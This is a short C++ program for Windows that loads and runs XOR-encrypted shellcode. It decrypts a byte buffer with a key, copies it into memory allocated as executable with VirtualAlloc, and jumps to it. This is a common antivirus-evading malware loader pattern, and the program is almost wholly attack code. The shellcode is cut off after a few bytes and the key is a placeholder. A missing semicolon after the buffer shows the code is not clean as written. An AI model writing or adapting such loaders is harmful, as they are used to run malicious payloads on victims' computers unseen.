#include <iostream>
#include <windows.h>

	void xorDecrypt(unsigned char* data, int length, const std::string & key) {
		int keyLength = key.length();
		for (int i = 0; i < length; i++) {
			data[i] = data[i] ^ key[i % keyLength];
		}
	}

	int main() {

		std::cout << "Current process PID is " << GetCurrentProcessId() << std::endl;

		// shellcode
		unsigned char buf[] =
			"\x98\x7b\xe0\x96\xc1\x98\xb4\x69\x30\x6e\x2a\x62\x38\x34"
            "..."

			int bufLentgh = sizeof(buf) - 1; // -1 to extract null terminator

        // decryption
		xorDecrypt(buf, bufLentgh, "<DecryptionKey>");

		void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		memcpy(exec, buf, sizeof(buf));

		((void(*)())exec)();

		return 0;
	}